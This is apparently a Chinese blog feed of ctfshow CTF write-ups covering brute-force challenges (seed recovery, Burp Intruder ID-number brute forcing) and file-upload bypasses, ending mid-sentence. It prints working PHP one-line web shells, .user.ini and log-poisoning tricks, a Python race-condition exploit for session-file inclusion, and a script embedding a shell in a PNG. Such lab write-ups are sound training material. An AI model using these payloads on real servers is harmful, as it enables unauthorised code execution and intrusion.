py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">a = <span class="string">&quot;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">        b = (<span class="built_in">str</span>(i) + <span class="built_in">str</span>(j)).encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        m = hashlib.md5(b).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> m[<span class="number">1</span>:<span class="number">2</span>] == m[<span class="number">14</span>:<span class="number">15</span>] <span class="keyword">and</span> m[<span class="number">14</span>:<span class="number">15</span>] == m[<span class="number">17</span>:<span class="number">18</span>]:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(m[<span class="number">1</span>:<span class="number">2</span>], <span class="number">16</span>) &gt; <span class="number">0</span> <span class="keyword">and</span> ((<span class="built_in">int</span>(m[<span class="number">1</span>:<span class="number">2</span>], <span class="number">16</span>) + <span class="built_in">int</span>(m[<span class="number">14</span>:<span class="number">15</span>], <span class="number">16</span>) + <span class="built_in">int</span>(m[<span class="number">17</span>:<span class="number">18</span>], <span class="number">16</span>)) / <span class="built_in">int</span>(m[<span class="number">1</span>:<span class="number">2</span>], <span class="number">16</span>)) == <span class="built_in">int</span>(m[<span class="number">31</span>:<span class="number">32</span>], <span class="number">16</span>):</span><br><span class="line">                <span class="built_in">print</span>(b)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>输出结果如上<br>因此可以轻松拿到flag</li></ol><h1 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>这段PHP脚本检查URL中是否设置了一个GET参数”r”。如果设置了，它将”r”参数的值赋给变量$r。然后使用值372619038种植Mersenne Twister随机数生成器，并使用mt_rand（）生成一个随机数。</li></ol><p>然后它将$r变量的值与生成的随机数进行比较，如果它们相等，则打印标记。如果未设置”r”参数，则会突出显示脚本的源代码并将命令 <code>&#39;result &#39;cat /proc/version&#39;</code> 打印到屏幕上。</p><p>只要知道了种子372619038和使用的mt_rand，就可以知道生成的伪随机数为1155388967(不同PHP版本得出的值可能不同)，这是一个固定值。在开发中尽量不要设置种子。<br>因此轻松拿到flag</p><h1 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    <span class="variable">$rand</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)-<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$rand</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>本题的考点是，只要知道随机数的值，就有可能反推出种子。</li></ol><ul><li>hexdec()函数<br>十六进制转换为十进制<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">hexdec</span>(<span class="keyword">string</span> <span class="variable">$hex_string</span>): <span class="keyword">int</span>|<span class="keyword">float</span></span><br></pre></td></tr></table></figure>返回与 hex_string 参数所表示的十六进制数等值的的十进制数。hexdec() 将一个十六进制字符串转换为十进制数。<br>hexdec() 会忽略它遇到的任意非十六进制的字符。自 PHP 7.4.0 起，弃用使用任何无效字符。</li></ul><p>这段PHP脚本检查URL中是否设置了一个GET参数”r”。如果设置了，它将”r”参数的值赋给变量$r。然后使用flag的md5值的前8个字符种植Mersenne Twister随机数生成器，并使用mt_rand（）生成一个随机数。<br>然后它将$r变量减去生成的随机数，并将结果存储在$rand变量中。<br>如果$rand变量等于0，它将检查’token’ cookie是否具有两个由mt_rand（）生成的随机数的和的值。如果cookie值匹配，则会打印$flag的值。如果$rand变量不等于0，则会打印$rand变量的值。</p><p>首先，我们让r为0，这样便能够打印出伪随机数的负值，我们知道了伪随机数的值后，需要通过一个工具来逆推出种子值。</p><ol start="2"><li>使用工具逆推种子值<br>这个<a href="https://www.openwall.com/php_mt_seed/">php_mt_seed</a>工具对于逆推mt_srand的种子值很有帮助。<br>使用kali,进入页面后，下载红色方框标注的位置：<br><img src="/simg/web25_1.png" alt=" "><br>下载好压缩包后进行提取，或通过命令行进入压缩包目录后进行如下操作：<br><code>tar zxvf php_mt_seed-4.0.tar.gz</code><br>由于安装包不是最新的，我们需要进行如下操作：<br><code>cd php_mt_seed-4.0</code><br><code>make</code><br><code>ls</code><br>我们会发现多出来一个用其它颜色标注的 <code>php_mt_seed</code><br>之后提升权限（如果不可以，则换成管理员身份），我们需要进行如下操作：<br><code>cd ..</code><br><code>chmod 777 php_mt_seed-4.0</code><br>最后再进入目录：<br><code>cd ./php_mt_seed-4.0</code><br>接下来就能够进行逆推种子了，我们进行如下操作：<br><code>time ./php_mt_seed 1537148198</code><br>在这个操作中，可能会生成版本不同的多个种子值。由于本题的PHP版本为7.3.11，我们就只看7.1+版本的种子值。<br>将种子值代入PHP脚本：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">0x00d06668</span>);</span><br><span class="line"><span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>();</span><br></pre></td></tr></table></figure>因为Cookie需要的是第2个和第3个随机数之和，于是我们的脚本只需要输出2，3随机数之和即可。<br>经过多次尝试后，终于找到了正确的种子值，也成功拿到了flag。</li></ol><h1 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h1><p>代码逻辑有问题，直接抓包即可拿到flag</p><h1 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h1><ol><li>收集信息<br>打开页面后，我们发现需要学号和密码才能登录，而这两者我们都不知道。<br>然后还发现了录取名单和学生学籍查询系统，分别打开后，我们发现：<br>录取名单里出现了个人信息，姓名和身份证号，但是身份证号的中间8位被隐藏了。<br>学生学籍查询系统里可以根据姓名和身份证号查询学号。<br>于是我们的目标在于破解身份证号，然后用查询系统查询学号和密码。<br>那么，要破解身份证号，我们首先要搞清身份证号的组成规则：</li></ol><p>1.2位表示省（自治区、直辖市、特别行政区）。<br>3.4位表示市（地级市、自治州、地区、盟及直辖市所属区和县的汇总码）<br>5.6位表示县（区、县级市、旗）<br>7-14（身份证号码第七位到第十四位）表示编码对象出生的年、月、日，<br>15.16位表示所在地的派出所的代码。<br>17位标识性别：奇数表示男性，偶数表示女性。<br>18位为校验码</p><p>根据组成规则可知，我们要爆破的即为出生信息，那么将查询系统进行抓包，然后送到Intruder<br>p的后面确定为爆破位置，然后Payloads下的Payload Sets的Payload type设置为Dates，时间从1990到2000，位置从1到31，格式设置为yyyyMMdd<br>然后在Payload Processing处设置前缀为621022，后缀为5237<br>然后开始爆破，成功拿到身份证号，在响应中发现Unicode编码的字符:<br><code>\u606d\u559c\u60a8\uff0c\u60a8\u5df2\u88ab\u6211\u6821\u5f55\u53d6\uff0c\u4f60\u7684\u5b66\u53f7\u4e3a02015237 \u521d\u59cb\u5bc6\u7801\u4e3a\u8eab\u4efd\u8bc1\u53f7\u7801</code><br>解码后得到如下信息：<br><code>恭喜您，您已被我校录取，你的学号为02015237 初始密码为身份证号码</code><br>那么直接输入学号密码，即可拿到flag。</p><h1 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h1><p>暴力破解目录，我们可以看到URL为如下所示：<br><code>http://f1cc8a3d-95f3-44fb-8faf-11ed2f3aa85c.challenge.ctf.show/0/1/2.txt</code><br>其中0，1我们直接暴力破解，在这两个位置爆破数字1到100，像下面那样：<br><code>GET /§0§/§1§/index.php HTTP/1.1</code><br>然后将Positions处的Attack type改为Cluster bomb，便于我们爆破多个。</p><ul><li>Payloads<br>该页面下的Payload Sets 的Payload type修改为Numbers<br>并在Payload Options处From:1  To:100  Step: 1<br>两个爆破的位置都要设置，总计爆破10000次，调整线程，可以加快速度。</li></ul><p>最后成功拿到flag</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>爆破篇到这里就结束了，总的来说内容不多，难度不大。爆破类型还是较少，不过也并非毫无收获。希望能够有更加丰富的爆破训练。<br>这里再补充一点关于<a href="https://blog.csdn.net/weixin_39190897/article/details/86539542">验证码爆破与绕过的小知识</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;对于爆破，我的能力还非常不足，虽说是最后手段，但尽量不要有短板比较好。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="爆破" scheme="http://example.com/categories/CTF/%E7%88%86%E7%A0%B4/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="爆破" scheme="http://example.com/tags/%E7%88%86%E7%A0%B4/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-web入门-文件上传</title>
    <link href="http://example.com/2023/01/11/ctfshow-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>http://example.com/2023/01/11/ctfshow-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
    <published>2023-01-10T16:00:00.000Z</published>
    <updated>2023-01-12T09:00:15.343Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>没啥好说的。</p><span id="more"></span><h1 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h1><ol><li>分析<br>通过尝试可知，这是在前端验证，于是我们尝试禁用js，但是会导致无法上传文件，于是放弃该方案。<br>然后通过尝试上传文件发现，只能上传后缀为png格式的文件，我们可以将一句话木马改为png格式上传，再用burp抓包后改为php后缀，最后使用蚁剑连接即可。</li><li>上传<br>和分析情况相同，直接上传成功，用蚁剑连接后，在上一级目录拿到flag。</li></ol><h1 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h1><p>考点是MIME Type，验证Content-Type是否为Image&#x2F;png<br>方式和前一题一样</p><h1 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h1><p>是关于.user.ini的应用，实际上就是一个用户可以修改的配置文件，之前的一道CTF题里提及过该<a href="https://truthnian.github.io/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-_easyupload/">知识点</a>。</p><ol><li>上传<br>首先写好一个一句话木马，修改为c.png文件，直接上传<br>然后写好一个.user.ini文件，内容为：<br><code>auto_prepend_file=c.png</code><br>然后把该文件后缀改为png，抓包后再修改回ini<br>上传成功后，蚁剑连接：<br><code>http://46665bc5-3785-4b06-8c0a-4c3520c474bf.challenge.ctf.show/upload/</code><br>即可拿到flag</li></ol><h1 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h1><p>本题检测了文件中的php字符串，一句话木马可以改为简写方式：<br><code>&lt;?=eval($_REQUEST[&#39;cmd&#39;]);?&gt;</code><br>或者大小写绕过</p><p>和上一题方法一样<br>成功拿到flag</p><h1 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h1><p>过滤了php，只能使用简写方式。</p><p>和上一题方法一样<br>成功拿到flag</p><h1 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h1><p>多次尝试发现是过滤了[]<br>于是我们将一句话木马改为：<br><code>&lt;?=eval($_REQUEST&#123;&#39;cmd&#39;&#125;);?&gt;</code><br>仍然需要上传.user.ini文件<br>成功拿到flag</p><h1 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h1><p>被过滤了的有 <code>php, [], ;</code><br>因此无法使用一句话木马，我们改为执行代码，使用system函数显示出所需的flag文件<br>仍然需要上传.user.ini文件<br>成功拿到flag</p><p>将文件内容修改为：<br><code>&lt;?=system(&#39;cat ../f*&#39;)?&gt;</code><br>然后上传，<br>仍然需要上传.user.ini文件<br>完毕后访问页面: <code>url/upload/index.php</code><br>查看源代码，最终拿到flag</p><h1 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h1><p>仍然需要上传.user.ini文件<br>和上一题几乎一致，访问页面: <code>url/upload</code><br>查看源代码，最终拿到flag</p><h1 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h1><p>由于过滤了 <code>()</code><br>所以我们使用反引号(`)，由此代码为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`cat ../f*`?&gt;</span><br></pre></td></tr></table></figure><h1 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h1><p>Linux下：<br>nginx的默认日志地址为: <code>/var/log/nginx/access.log</code><br>apache的默认日志地址为: <code>/var/log/apache2/access.log</code></p><p>在这道题中，反引号和空格均被过滤，那么我们采用日志文件包含。<br>原理是将一句话木马写入ua中，然后ua的内容会传到日志文件，由于我们将日志文件包含了，那么就能显示一句话木马，也即可以连接蚁剑。<br>首先，日志文件默认格式为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">log_format access &#x27;$remote_addr – $remote_user [$time_local] &quot;$request&quot;&#x27; &#x27;$status $body_bytes_sent &quot;$http_referer&quot;&#x27; &#x27;&quot;$http_user_agent&quot; $http_x_forwarded_for&#x27;;</span><br></pre></td></tr></table></figure><p>于是我们可以写入文件内容如下:<br><code>&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</code><br>同时抓包，修改ua为一句话木马。<br>最后通过蚁剑连接：<br><code>http://6514c240-517e-4eca-b889-2f61dacb8762.challenge.ctf.show/upload/</code><br>即可拿到flag</p><h1 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h1><p>这道题利用 <code>getimagesize()</code> 函数验证文件头，那么我们可以使用 <code>GIF89a</code> 绕过检测。<br>只需在上一题的基础上，在每个文件加上GIF89a即可。</p><h1 id="web162"><a href="#web162" class="headerlink" title="web162"></a>web162</h1><ol><li><p>分析<br>这一次过滤了 <code>. flag</code>因此无法再使用原来的方式绕过，那么我们可以使用SESSION文件包含+条件竞争方式获取flag<br>这里有两篇文章可以详细解释SESSION文件包含的原理：<br><a href="https://www.php.net/manual/zh/session.upload-progress.php">Session 上传进度</a><br><a href="https://www.freebuf.com/vuls/202819.html">利用session.upload_progress进行文件包含</a><br>简单说一下原理：<br>在php.ini有以下几个默认选项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1. session.upload_progress.enabled = on</span><br><span class="line">//表示upload_progress的功能开始，当浏览器向服务器上传一个文件时，</span><br><span class="line">//php将会把这次文件上传的详细信息（如上传时间，进度等）存储在session中，可以发送一个POST请求终端来检查这个状态</span><br><span class="line">2. session.upload_progress.cleanup = on</span><br><span class="line">//表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要</span><br><span class="line">3. session.upload_progress.prefix = &quot;upload_progress_&quot;</span><br><span class="line">4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">//name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</span><br><span class="line">//prefix+name将表示为session中的键名</span><br><span class="line">5. session.upload_progress.freq = &quot;1%&quot;</span><br><span class="line">6. session.upload_progress.min_freq = &quot;1&quot;</span><br><span class="line">7. session.use_strict_mode=0</span><br><span class="line">//此时用户可以自定义Session ID.</span><br><span class="line">//比如：在Cookie里设置PHPSESSID=123,PHP将在服务器上创建一个文件: /tmp/sess_123</span><br><span class="line">//即使此时用户没有初始化Session，也会自动初始化Session,并产生一个prefix+name连接在一起的值。</span><br></pre></td></tr></table></figure><p>也就是说，Session文件里有flag，当用POST方式带有命令执行的数据访问页面时，Session文件里会包含有flag数据，因此我们可以尝试获取Session文件的数据来获取flag，但由于Session文件的数据很快会被php.ini中的 <code>session.upload_progress.cleanup = on</code> 清空，因此我们需要采取条件竞争的方式获取flag。</p></li><li><p>上传<br>首先上传.user.ini,内容是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=&quot;png&quot;</span><br></pre></td></tr></table></figure><p>然后上传png，内容是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?=include&quot;/tmp/sess_123&quot;?&gt;</span><br></pre></td></tr></table></figure><p>最后使用python写一个条件竞争的脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">sess = <span class="string">&#x27;123&#x27;</span></span><br><span class="line">url1 = <span class="string">&quot;http://18d32c08-41bb-4ede-a7fd-4ecaa9b8b551.challenge.ctf.show/&quot;</span></span><br><span class="line">url2 = <span class="string">&quot;http://18d32c08-41bb-4ede-a7fd-4ecaa9b8b551.challenge.ctf.show/upload&quot;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;123&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = session.post(url1, data=data1, files=file, cookies=cookies)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = session.get(url2)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">threads = [threading.Thread(target=write),</span><br><span class="line">           threading.Thread(target=read)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这段代码利用PHP Web应用程序中的竞争条件读取包含flag的文件。<br>设置了‘PHPSESSID’的cookies为’sess’的值为’123’<br>创建了两个线程: 一个重复发送POST请求到url1变量指定的URL，带有一个 <code>PHP_SESSION_UPLOAD_PROGRESS</code> 参数，设置为包含PHP命令注入有效负载 <code>（&lt;?php system(&quot;tac ../f*&quot;);?&gt;）</code> 的字符串，另一个则重复发送GET请求到url2变量指定的URL，检查响应文本的”flag”字符串。</p></li></ol><h1 id="web163"><a href="#web163" class="headerlink" title="web163"></a>web163</h1><p>与上一题相同</p><h1 id="web164"><a href="#web164" class="headerlink" title="web164"></a>web164</h1><p>图片上传后会对其重命名，并且需要上传真实的png图片。<br>一般的一句话木马图片上传后会对其二次渲染，导致图片内的木马消失。</p><p>图片二次渲染是指对已经存在的图片进行修改或重新绘制的过程。这可以包括调整图像的颜色，添加新元素，或者删除现有元素等。<br>二次渲染可以用来改变图片的外观，或者用来添加水印，或者用来删除不需要的元素。它也可以用来调整图像的尺寸，或者对图像进行格式转换等。<br>图像二次渲染可以使用许多不同的工具来实现，包括专业的图像编辑软件，如 Photoshop 或 GIMP，也可以使用编程语言和图像处理库，如 PHP GD 库。<br>在图像处理过程中，二次渲染可以使用许多不同的技术，如图像分析、图像滤镜、图像插值和图像变换等。</p><p>因此我们需要通过PHP GD库来创建一张含有木马的图片能绕过服务器的二次渲染。PHP代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;D:/temp/b2.png&#x27;</span>);  <span class="comment">//要修改的图片的路径</span></span><br><span class="line"><span class="comment">/* 图片内木马内容</span></span><br><span class="line"><span class="comment">&lt;?$_GET[0]($_POST[1]);?&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这段代码使用了 PHP GD 